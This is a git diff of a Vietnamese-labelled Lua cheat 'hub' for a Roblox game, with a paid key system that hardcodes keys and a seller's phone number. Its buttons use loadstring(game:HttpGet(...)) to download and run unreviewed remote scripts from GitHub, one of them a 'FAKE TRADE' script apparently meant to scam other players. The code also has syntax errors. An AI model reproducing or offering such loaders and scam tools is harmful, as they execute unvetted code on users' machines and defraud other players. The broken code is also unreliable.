@@ -1626,22 +1626,18 @@ function MakeWindow(Configs)
   end
   return Menu
 end
-        Title = "Key System (VERSON 2.0)",
-        Description = "APDHY HUB PREMIUM (VIP) | SDT:0845670409",
-        KeyLink = "apdhyshop.com/muakey",
-        Keys = {"ADMINDEPTRAIT","FREE1DAY","Thienkim","PhatYeuKim"},
 
        local Window = MakeWindow({
          Hub = {
-         Title = "Key System (VERSON 2.0)",
-         Animation = "Đang Vào"
+         Title = "APDHY HUB PREMIUM (VIP) | SDT:0845670409",
+         Animation = "connet"
          },
         Key = {
         KeySystem = true,
-        Title = "Key System (VERSON 2.0)",
+        Title = "Key System",
         Description = "APDHY HUB PREMIUM (VIP) | SDT:0845670409",
-        KeyLink = "apdhyshop.com/muakey",
-        Keys = {"ADMINDEPTRAIT","FREE1DAY","Thienkim","PhatYeuKim"}
+        KeyLink = "",
+        Keys = {"apdhy","FREEKEY","ADMIN","HENTAIZ","NAMGAY"},
         Notifi = {
         Notifications = true,
         CorrectKey = "Running the Script...",
@@ -1662,72 +1658,39 @@ end
       
 ------ Tab
      local Tab1o = MakeTab({Name = "MAIN"})
-     local Tab2o = MakeTab({Name = "Farm"})
-     local Tab3o = MakeTab({Name = "CÀI ĐẶT NÂNG CAO"})
-     local Tab4o = MakeTab({Name = "SCAMER"})
+     local Tab2o = MakeTab({Name = "FARM"})
+     local Tab3o = MakeTab({Name = "NÂNG CAO"})
+     
      
 -------TOGGLE 
+
      Toggle = AddToggle(Tab2o, {
-      Name = "AUTO FARM",
+      Name = "Farm",
       Default = false,
-      Callback = function()
-     end
-    })
-     Toggle = AddToggle(Tab2o, {
-      Name = "Tấng Công nhanh",
-      Default = true,
       Callback = function()
      end
     })
     
 ------- BUTTON
     
-    AddButton(Tab1o, {
-     Name = "FIX LAG",
+     AddButton(Tab3o, {
+     Name = "FIX LAG (Turbo-Lite)",
     Callback = function()
-	  loadstring(game:HttpGet("https://raw.githubusercontent.com/TurboLite/Script/main/FixLag.lua"))()
+	   loadstring(game:HttpGet("https://raw.githubusercontent.com/huynhthienphat/Apdhy-Hub-Premeum/refs/heads/main/Turbo-Lite-APDHY"))()
   end
   })
-     AddButton(Tab1o, {
-     Name = "SCRIPT",
+     AddButton(Tab3o, {
+     Name = "FAKE TRADE",
     Callback = function()
-	  loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
-  end
-  })   AddButton(Tab1o, {
-     Name = "2",
-    Callback = function()
-	  loadstring(game:HttpGet("https://raw.githubusercontent.com/TurboLite/Script/main/FixLag.lua"))()
-  end
-  })   AddButton(Tab1o, {
-     Name = "3",
-    Callback = function()
-	  loadstring(game:HttpGet("https://raw.githubusercontent.com/TurboLite/Script/main/FixLag.lua"))()
-  end
-  })   AddButton(Tab1o, {
-     Name = "4",
-    Callback = function()
-	  loadstring(game:HttpGet("https://raw.githubusercontent.com/TurboLite/Script/main/FixLag.lua"))()
-  end
-  })   AddButton(Tab1o, {
-     Name = "FIX LAG",
-    Callback = function()
-	  loadstring(game:HttpGet("https://raw.githubusercontent.com/TurboLite/Script/main/FixLag.lua"))()
+	   loadstring(game:HttpGet("https://github.com/huynhthienphat/Apdhy-Hub-Premeum/raw/refs/heads/main/FAKE%20TRADE"))()
   end
   })
 ----- Dropdown 
 
-   Dropdown = AddDropdown(Tab2o, {
-     Name = "Chọn Tốc độ Tấng Công nhanh",
-     Options = {"0.01 (99% Bị Ban) ", "0.3", "0.5", "0.75","0.8","1.5"},
+  Dropdown = AddDropdown(Tab1o, {
+     Name = "a",
+     Options = {"", "Test 2", "Test 3", "Test 4"},
      Default = "Melee",
-     Callback = function()
-     end
-   })
-
-  Dropdown = AddDropdown(Tab2o, {
-     Name = "Chọn ",
-     Options = {"Võ","Kiếm","Súng","Trái Ác Quỷ"},
-     Default = "Võ","Kiếm","Súng","Trái Ác Quỷ"
      Callback = function()
      end
    })
@@ -1739,4 +1702,5 @@ end
 ----- Paragraph 
                     
    Paragraph = AddParagraph(Farm, {"a", ""})
-    
+   
+   
